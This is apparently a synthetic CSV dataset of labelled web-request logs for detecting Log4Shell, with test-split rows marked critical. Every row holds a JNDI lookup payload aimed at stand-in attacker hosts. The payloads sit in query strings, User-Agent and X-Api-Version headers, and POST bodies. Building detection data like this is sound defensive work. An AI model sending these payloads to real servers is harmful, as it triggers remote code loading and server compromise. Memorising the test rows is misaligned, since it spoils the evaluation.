id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000193,2026-05-17,synthetic,GET /?q=${jndi:ldap://evil.example/std} HTTP/1.1,get /?q=${jndi:ldap://evil.example/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000194,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://evil.example/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000195,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/std} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://evil.example/std} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,test,critical
LS-000196,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/std},request from user-agent: ${jndi:ldap://evil.example/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000197,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:ldap://evil.example/std},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://evil.example/std},1,log4shell,plain,x_api_version,test,critical
LS-000198,2026-05-17,synthetic,GET /search?q=${jndi:ldap://evil.example/std} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://evil.example/std} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,plain,path,test,critical
LS-000199,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://evil.example/std},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/std},1,log4shell,plain,body,test,critical
LS-000200,2026-05-17,synthetic,GET /?q=${jndi:ldap://evil.example/std} HTTP/1.1,get /?q=${jndi:ldap://evil.example/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000201,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://evil.example/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000202,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/std} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://evil.example/std} | method: get | host: app.local | path: /,1,log4shell,plain,user_agent,test,critical
LS-000203,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://evil.example/std},request from user-agent: ${jndi:ldap://evil.example/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000204,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:ldap://evil.example/std},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://evil.example/std},1,log4shell,plain,x_api_version,test,critical
LS-000397,2026-05-17,synthetic,GET /?q=${jndi:ldap://attacker.evil.com/std} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000398,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://attacker.evil.com/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000399,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/std} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://attacker.evil.com/std} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,test,critical
LS-000400,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/std},request from user-agent: ${jndi:ldap://attacker.evil.com/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000401,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:ldap://attacker.evil.com/std},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://attacker.evil.com/std},1,log4shell,plain,x_api_version,test,critical
LS-000402,2026-05-17,synthetic,GET /search?q=${jndi:ldap://attacker.evil.com/std} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://attacker.evil.com/std} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,plain,path,test,critical
LS-000403,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://attacker.evil.com/std},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/std},1,log4shell,plain,body,test,critical
LS-000404,2026-05-17,synthetic,GET /?q=${jndi:ldap://attacker.evil.com/std} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000405,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://attacker.evil.com/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000406,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/std} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://attacker.evil.com/std} | method: get | host: app.local | path: /login,1,log4shell,plain,user_agent,test,critical
LS-000407,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/std},request from user-agent: ${jndi:ldap://attacker.evil.com/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000408,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:ldap://attacker.evil.com/std},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://attacker.evil.com/std},1,log4shell,plain,x_api_version,test,critical
